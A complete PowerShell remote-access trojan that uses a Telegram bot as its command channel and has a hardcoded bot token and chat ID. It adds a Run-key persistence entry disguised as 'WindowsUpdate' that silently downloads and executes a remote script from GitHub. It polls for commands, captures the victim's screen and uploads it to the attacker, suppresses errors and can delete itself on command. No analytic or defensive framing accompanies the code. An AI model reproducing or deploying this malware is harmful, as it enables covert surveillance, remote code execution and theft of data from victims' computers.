# ================= CONFIG (EDIT THESE THREE) =================
$BotToken  = "9113495270:AAH-QUdzKsPLPbvJ0ACCnhe6d8ESCBGxfDw"
$ChatID    = "7796433181"
$PayloadURL = "https://raw.githubusercontent.com/theronscroll-star/utils/refs/heads/main/config.ps1"
# =============================================================

# ---- INSTALL PERSISTENCE (runs every time) ----
$persistCmd = "powershell -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$PayloadURL')`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsUpdate" -Value $persistCmd -PropertyType String -Force | Out-Null

$LastUpdate = 0

while ($true) {
    try {
        # Poll Telegram for new commands
        $url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($LastUpdate + 1)&timeout=30"
        $response = Invoke-RestMethod -Uri $url

        foreach ($update in $response.result) {
            $LastUpdate = $update.update_id
            $msg = $update.message.text

            if ($msg -match "screenshot") {
                # Take screenshot
                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                $g.Dispose()

                # Convert to bytes in memory
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                $bytes = $ms.ToArray()
                $bmp.Dispose()

                # Send photo via Telegram
                Add-Type -AssemblyName System.Net.Http
                $client = New-Object System.Net.Http.HttpClient
                $form = New-Object System.Net.Http.MultipartFormDataContent

                $chatContent = New-Object System.Net.Http.StringContent($ChatID)
                $form.Add($chatContent, "chat_id")

                $imgContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
                $imgContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
                $form.Add($imgContent, "photo", "screen.png")

                $sendUrl = "https://api.telegram.org/bot$BotToken/sendPhoto"
                $client.PostAsync($sendUrl, $form).Wait()
                $client.Dispose()
            }

            if ($msg -match "die") {
                # ---- SELF-DESTRUCT ----
                # 1. Remove persistence
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                  -Name "WindowsUpdate" -ErrorAction SilentlyContinue

                # 2. Kill this process
                Stop-Process -Id $PID -Force
            }
        }
    } catch {
        # Silently continue on errors
    }
    Start-Sleep -Seconds 3
}
